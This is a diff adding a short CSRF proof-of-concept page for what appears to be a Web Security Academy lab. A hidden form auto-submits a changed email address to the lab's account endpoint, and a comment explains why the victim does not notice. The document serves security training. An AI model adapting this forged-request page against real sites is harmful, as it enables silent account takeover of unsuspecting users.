@@ -1,0 +1,26 @@
+<html>
+    <body>
+        <form id="vulncode" name="change-email-form" action="https://[lab_id].web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="vulerable@gmail.com">
+        </form>
+
+    <script>
+        document.getElementById("vulncode").submit();
+    </script>
+
+    </body>
+</html>
+
+<!--
+The source code shows that the POST method directly sends the email value from the input field
+to the server endpoint without performing any CSRF validation. This allows an attacker to exploit
+the functionality by crafting a malicious HTML page. 
+
+When a victim visits this page, it silently redirects their browser to the vulnerable endpoint 
+and auto-submits a forged request using a JavaScript script. As a result, the victim’s email 
+is changed without their knowledge.
+
+Since the application neither provides an alert/notification about the update nor the attacker site
+is visible as the input field is made hidden, thus the victim remains unaware of the modification and 
+continues using the site as usual.
+-->
